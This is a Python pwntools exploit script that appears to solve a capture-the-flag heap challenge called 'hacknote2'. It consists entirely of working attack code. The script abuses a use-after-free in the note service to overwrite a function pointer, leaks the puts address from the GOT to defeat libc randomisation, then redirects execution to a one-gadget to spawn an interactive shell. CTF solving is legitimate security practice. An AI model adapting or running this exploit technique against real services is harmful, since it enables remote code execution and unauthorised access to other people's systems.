#!/usr/bin/env python
from pwn import *

#r = remote("csie.ctf.tw",10139)
r = remote("127.0.0.1",8889)
#print_note_content = 0x400886
#after it is the ptr to user data

elf = ELF("./hacknote2")
libc = ELF("./libc.so.6")
puts_off = libc.symbols['puts']

def ad(size,content):
	r.recvuntil(":")
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(str(size))
	r.recvuntil(":")
	r.sendline(content)

def de(index):
	r.recvuntil(":")
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(index))

def pri(index):
	r.recvuntil(":")
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(index))
puts_got = 0x602028
prit = 0x400886
ad(32,"ddaa")  #0
ad(32,"ddaa")  #1
de(0)
de(1)
ad(16,p64(prit)+p64(puts_got))   #2 
pri(0)
r.recvuntil(":")
puts_addr = u64(r.recv(6).ljust(8,"\x00")) 
lib = puts_addr - puts_off
system = lib + 0xf1117
de(2)
ad(16,p64(system))
pri(0)
r.interactive()
